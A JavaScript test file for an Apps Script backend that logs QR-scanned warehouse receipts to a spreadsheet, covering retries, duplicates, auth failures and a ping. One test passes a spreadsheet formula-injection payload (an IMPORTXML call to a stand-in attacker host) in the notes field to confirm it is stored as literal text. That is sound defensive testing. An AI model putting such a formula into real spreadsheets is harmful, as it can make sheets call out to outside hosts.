import test from 'node:test';
import assert from 'node:assert/strict';
import vm from 'node:vm';
import fs from 'node:fs';
const source=fs.readFileSync(new URL('../apps-script/Code.gs',import.meta.url),'utf8');
const sample={id:'11111111-1111-4111-8111-111111111111',rawQR:'QR-unique-001',employee:'WH001',materialCode:'000123',materialName:'Part',specification:'',lotNumber:'0001',warehouse:'Main',location:'A01',quantity:25,unit:'EA',notes:'',createdAt:'2026-09-05T00:00:00Z'};
function backend(){
 const rows=[];let released=0;
 const ctx={ContentService:{MimeType:{JSON:'JSON'},createTextOutput:text=>({text,setMimeType(){return this;}})},PropertiesService:{getScriptProperties:()=>({getProperty:key=>({ACCESS_CODE:'testing-code-123456',SPREADSHEET_ID:'test-sheet'}[key])})},LockService:{getScriptLock:()=>({tryLock:()=>true,releaseLock:()=>released++})}};
 vm.createContext(ctx);vm.runInContext(source,ctx);rows.push(Array.from(ctx.RECEIPT_HEADERS));
 const sheet={getMaxRows:()=>1000,insertRowsAfter(){},getLastRow:()=>rows.length,getRange:(row,col,count=1,width=1)=>({getValues:()=>rows.slice(row-1,row-1+count).map(r=>r.slice(col-1,col-1+width)),getValue:()=>rows[row-1][col-1],setNumberFormat(){return this;},setValues:values=>{values.forEach((v,i)=>{rows[row-1+i]=v;});},createTextFinder:value=>({matchEntireCell(){return this;},useRegularExpression(){return this;},findNext(){const index=rows.findIndex((r,i)=>i>=row-1&&i<row-1+count&&r[col-1]===value);return index<0?null:{getRow:()=>index+1};}})})};
 ctx.SpreadsheetApp={openById:()=>({getSheetByName:()=>sheet}),flush(){}};
 return {ctx,rows,released:()=>released,post:body=>JSON.parse(ctx.doPost({postData:{contents:JSON.stringify(body)}}).text)};
}
const payload=receipt=>({action:'receive',accessCode:'testing-code-123456',receipt});
test('a retried receipt is acknowledged without adding another row',()=>{const b=backend();assert.equal(b.post(payload({...sample})).ok,true);assert.equal(b.post(payload({...sample})).replayed,true);assert.equal(b.rows.length,2);assert.equal(b.released(),2);});
test('same QR on another phone cannot be received twice',()=>{const b=backend();b.post(payload({...sample}));const r=b.post(payload({...sample,id:'22222222-2222-4222-8222-222222222222'}));assert.equal(r.duplicate,true);assert.equal(b.rows.length,2);});
test('auth and validation failures never write rows',()=>{const b=backend();assert.equal(b.post({...payload({...sample}),accessCode:'wrong'}).ok,false);assert.equal(b.post(payload({...sample,quantity:-1})).ok,false);assert.equal(b.post(payload({...sample,lotNumber:''})).ok,false);assert.equal(b.rows.length,1);});
test('text that looks like a formula is stored as literal text',()=>{const b=backend();b.post(payload({...sample,notes:'=IMPORTXML("https://evil.test", "//x")'}));assert.ok(b.rows[1][13].startsWith("'="));assert.equal(b.rows[1][5],'000123');assert.equal(b.rows[1][11],25);});
test('connection test performs no receipt write',()=>{const b=backend();assert.equal(b.post({action:'ping',accessCode:'testing-code-123456'}).ok,true);assert.equal(b.rows.length,1);});
